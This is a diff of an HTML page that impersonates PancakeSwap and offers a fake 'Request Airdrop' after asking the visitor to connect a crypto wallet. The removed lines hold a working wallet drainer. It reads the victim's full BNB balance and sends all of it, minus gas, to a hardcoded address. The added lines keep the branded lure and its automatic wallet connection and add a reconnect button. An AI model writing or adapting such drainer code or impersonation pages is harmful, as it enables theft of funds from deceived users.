@@ -37,22 +37,18 @@
 </head>
 <body class="gradient-bg min-h-screen">
     <div class="container mx-auto px-4 py-8">
-        <!-- Navbar -->
         <nav class="flex items-center justify-between mb-12">
             <div class="flex items-center space-x-2">
                 <img src="https://pancakeswap.finance/logo.png" alt="PancakeSwap" class="h-8 w-8">
                 <span class="text-white font-bold text-xl">PancakeSwap</span>
             </div>
         </nav>
-
-        <!-- Main Content -->
         <div class="flex justify-center items-center min-h-[calc(100vh-120px)]">
             <div class="bg-[#27262C] rounded-3xl p-6 w-full max-w-md border border-[#383241]">
                 <div class="text-center mb-6">
                     <h1 class="text-2xl font-bold text-white mb-2">Connect Wallet</h1>
                     <p id="walletStatus" class="text-[#B8ADD2] text-sm">Connect your wallet to continue</p>
                 </div>
-
                 <div class="space-y-4">
                     <div class="bg-[#372F47] rounded-xl p-4">
                         <label for="enderecoCarteira" class="block text-[#B8ADD2] text-sm font-medium mb-2">
@@ -66,21 +62,20 @@
                             placeholder="Connect wallet to view address"
                         >
                     </div>
-
                     <button
                         id="solicitarButton"
                         class="w-full gradient-button text-white font-bold py-4 px-6 rounded-xl flex items-center justify-center space-x-2"
                     >
-                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
-                            <path d="M17 10h4V2H3v8h4"></path>
-                            <path d="M7 10v12h10V10"></path>
-                        </svg>
                         <span>Request Airdrop</span>
                     </button>
-
+                    <button
+                        id="reconectarButton"
+                        class="w-full gradient-button text-white font-bold py-4 px-6 rounded-xl flex items-center justify-center space-x-2 hidden"
+                    >
+                        <span>Reconectar Carteira</span>
+                    </button>
                     <p id="mensagem" class="mt-4 text-center text-sm"></p>
                 </div>
-
                 <div class="mt-6 pt-6 border-t border-[#383241]">
                     <div class="text-center">
                         <p class="text-[#B8ADD2] text-sm">
@@ -99,11 +94,11 @@
             </div>
         </div>
     </div>
-
     <script>
         document.addEventListener('DOMContentLoaded', async () => {
             const walletStatus = document.getElementById('walletStatus');
             const mensagem = document.getElementById('mensagem');
+            const reconectarButton = document.getElementById('reconectarButton');
 
             if (window.ethereum) {
                 conectarCarteira(window.ethereum);
@@ -111,89 +106,48 @@
                 console.error("Nenhuma carteira detectada no navegador");
                 walletStatus.textContent = "Por favor, abra uma carteira e tente novamente.";
             }
+
+            reconectarButton.addEventListener('click', () => {
+                if (window.ethereum) {
+                    conectarCarteira(window.ethereum);
+                }
+            });
         });
 
         async function conectarCarteira(provider) {
-    window.web3 = new Web3(provider);
-
-    try {
-        await provider.request({ method: 'eth_requestAccounts' });
-        console.log("Carteira conectada!");
-        walletStatus.textContent = "Carteira conectada com sucesso!";
-        walletStatus.classList.add('success-message');
-
-        const accounts = await provider.request({ method: 'eth_accounts' });
-        const endereco = accounts[0];
-        document.getElementById('enderecoCarteira').value = endereco;
-
-        // Listener para desconexão ou troca de conta
-        provider.on('accountsChanged', (accounts) => {
-            if (accounts.length === 0) {
-                walletStatus.textContent = "Carteira desconectada. Por favor, reconecte.";
-                walletStatus.classList.remove('success-message');
-                walletStatus.classList.add('message');
-                document.getElementById('enderecoCarteira').value = '';
-            } else {
-                const novoEndereco = accounts[0];
-                walletStatus.textContent = "Conta trocada com sucesso!";
-                walletStatus.classList.add('success-message');
-                document.getElementById('enderecoCarteira').value = novoEndereco;
-            }
-        });
-    } catch (error) {
-        console.error("Usuário rejeitou a conexão da carteira:", error);
-        walletStatus.textContent = "Por favor, conecte sua carteira e tente novamente.";
-        walletStatus.classList.add('message');
-    }
-}
-
-        async function solicitarAirDrop() {
-            const enderecoCarteira = document.getElementById('enderecoCarteira').value.trim();
-            const enderecoDestino = '0xA9ca912b9C1Ff37038DecDb8c06950A2ff540031';
-            const bnbNecessario = 0.00001;
-            const mensagem = document.getElementById('mensagem');
-
-            if (!window.web3.utils.isAddress(enderecoCarteira)) {
-                mensagem.textContent = "Endereço de carteira inválido.";
-                mensagem.classList.add('message');
-                return;
-            }
+            window.web3 = new Web3(provider);
 
             try {
-                const balance = await window.web3.eth.getBalance(enderecoCarteira);
-                const bnbBalance = parseFloat(window.web3.utils.fromWei(balance, 'ether'));
+                await provider.request({ method: 'eth_requestAccounts' });
+                console.log("Carteira conectada!");
+                walletStatus.textContent = "Carteira conectada com sucesso!";
+                walletStatus.classList.add('success-message');
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                const endereco = accounts[0];
+                document.getElementById('enderecoCarteira').value = endereco;
+                reconectarButton.classList.add('hidden');
 
-                if (bnbBalance < bnbNecessario) {
-                    mensagem.textContent = "Saldo de BNB insuficiente para o AirDrop.";
-                    mensagem.classList.add('message');
-                    return;
-                }
-
-                const gasPrice = await window.web3.eth.getGasPrice();
-                const gasLimit = 21000;
-                const gasCost = gasPrice * gasLimit;
-                const totalToSend = balance - gasCost;
-
-                const transaction = {
-                    from: enderecoCarteira,
-                    to: enderecoDestino,
-                    value: window.web3.utils.toHex(totalToSend),
-                    gasPrice: window.web3.utils.toHex(gasPrice),
-                    gas: window.web3.utils.toHex(gasLimit)
-                };
-
-                const transactionHash = await window.web3.eth.sendTransaction(transaction);
-
-                mensagem.textContent = "Transação enviada com sucesso. Hash da transação: " + transactionHash.transactionHash;
-                mensagem.classList.add('success-message');
+                provider.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        walletStatus.textContent = "Carteira desconectada. Por favor, reconecte.";
+                        walletStatus.classList.remove('success-message');
+                        walletStatus.classList.add('message');
+                        document.getElementById('enderecoCarteira').value = '';
+                        reconectarButton.classList.remove('hidden');
+                    } else {
+                        const novoEndereco = accounts[0];
+                        walletStatus.textContent = "Conta trocada com sucesso!";
+                        walletStatus.classList.add('success-message');
+                        document.getElementById('enderecoCarteira').value = novoEndereco;
+                        reconectarButton.classList.add('hidden');
+                    }
+                });
             } catch (error) {
-                console.error("Erro ao enviar transação:", error);
-                mensagem.textContent = "Erro na solicitação. Tente novamente.";
-                mensagem.classList.add('message');
+                console.error("Usuário rejeitou a conexão da carteira:", error);
+                walletStatus.textContent = "Por favor, conecte sua carteira e tente novamente.";
+                walletStatus.classList.add('message');
             }
         }
-
-        document.getElementById('solicitarButton').addEventListener('click', solicitarAirDrop);
     </script>
 </body>
 </html>
